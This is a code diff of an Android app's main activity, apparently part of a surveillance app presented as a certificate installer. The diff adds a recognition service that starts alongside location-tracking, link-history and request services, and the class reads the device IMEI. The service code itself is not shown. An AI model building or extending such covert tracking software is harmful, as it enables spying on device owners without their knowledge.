@@ -24,32 +24,25 @@ import android.view.Menu;
 import android.widget.Button;
 import android.widget.EditText;
 
-import com.inet.android.audio.RecordAudio;
 import com.inet.android.certificate.R;
 import com.inet.android.history.LinkService;
 import com.inet.android.location.LocationTracker;
+import com.inet.android.location.RecognitionDevService;
 import com.inet.android.request.Request4;
 import com.inet.android.utils.Logging;
 
 public class MainActivity extends Activity {
 	Button install;
 	Button exit;
-	LocationTracker gps;
-	LinkService link;
 	AlertDialog.Builder ad;
 	Context context;
 	final String SAVED_TIME = "saved_time";
 	Editor e;
 	SharedPreferences sp;
-	byte[] data;
-	String incFile;
 	private String aboutDev;
 	private static String LOG_TAG = "mainActivity";
-	String fileID = "id.txt";
 	String ID = null;
 	List<String> result;
-	File root;
-	File[] fileArray;
 	private String sID;
 	String imeistring;
 
@@ -197,14 +190,14 @@ public class MainActivity extends Activity {
 		return true;
 	}
 
-	public boolean getID() {
+	private boolean getID() {
 		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");
 
 		File file[] = Environment.getExternalStorageDirectory().listFiles();
 		return recursiveFileFind(file);
 	}
 
-	public boolean recursiveFileFind(File[] file1) {
+	private boolean recursiveFileFind(File[] file1) {
 		int i = 0;
 		String filePath = " ";
 		if (file1 != null) {
@@ -240,7 +233,7 @@ public class MainActivity extends Activity {
 	/**
 	 * Start services
 	 */
-	public void start() {
+	private void start() {
 		Logging.doLog(LOG_TAG, "start services", "start services");
 
 		startService(new Intent(MainActivity.this, Request4.class));
@@ -250,7 +243,7 @@ public class MainActivity extends Activity {
 		} catch (InterruptedException e) {
 			e.printStackTrace();
 		}
-
+		startService(new Intent(MainActivity.this, RecognitionDevService.class));
 		startService(new Intent(MainActivity.this, LocationTracker.class));
 		startService(new Intent(MainActivity.this, LinkService.class));
 
